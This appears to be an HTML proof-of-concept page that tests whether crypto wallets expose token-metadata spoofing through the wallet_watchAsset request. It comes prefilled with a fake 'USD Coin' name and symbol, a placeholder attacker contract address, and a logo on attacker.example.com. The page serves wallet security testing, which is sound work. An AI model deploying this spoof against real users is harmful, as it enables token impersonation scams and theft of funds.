<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>PoC: wallet_watchAsset token metadata spoof</title>
  <style>body{font-family:system-ui, -apple-system, Roboto, Arial;padding:18px} button{padding:8px 12px}</style>
</head>
<body>
  <h2>PoC â€” wallet_watchAsset token metadata spoof</h2>
  <p>
    This demo requests the wallet to watch/add a token using dApp-supplied metadata that mimics a well-known token. Inspect the wallet dialog: does it show the contract address? does it label metadata as "dApp-provided"?
  </p>

  <div style="background:#fff4f4;padding:10px;border-radius:6px;margin-bottom:12px">
    <strong>Warning:</strong> Only inspect the add-token dialog. Do not approve any transactions. Use test accounts / testnets.
  </div>

  <label>Token contract (attacker): <input id="addr" value="0x1111111111111111111111111111111111111111" style="width:420px"></label><br/>
  <label>Displayed name: <input id="name" value="USD Coin"></label><br/>
  <label>Displayed symbol: <input id="sym" value="USDC"></label><br/>
  <label>Displayed decimals: <input id="dec" value="6"></label><br/>
  <label>Displayed logo URL: <input id="img" value="https://attacker.example.com/logo-usdc.png" style="width:420px"></label><br/><br/>

  <button id="run">Request wallet_watchAsset</button>

<script>
document.getElementById('run').addEventListener('click', async () => {
  if (!window.ethereum) return alert('No injected provider (window.ethereum) found.');
  const tokenAddress = document.getElementById('addr').value.trim();
  const name = document.getElementById('name').value.trim();
  const symbol = document.getElementById('sym').value.trim();
  const decimals = parseInt(document.getElementById('dec').value.trim(), 10);
  const image = document.getElementById('img').value.trim();

  const params = {
    type: 'ERC20',
    options: {
      address: tokenAddress,
      symbol: symbol,
      decimals: decimals,
      image: image,
      name: name
    }
  };

  try {
    const result = await window.ethereum.request({ method: 'wallet_watchAsset', params });
    alert('wallet_watchAsset result: ' + JSON.stringify(result));
  } catch (err) {
    console.error(err);
    alert('Error or request rejected. See console.');
  }
});
</script>
</body>
</html>
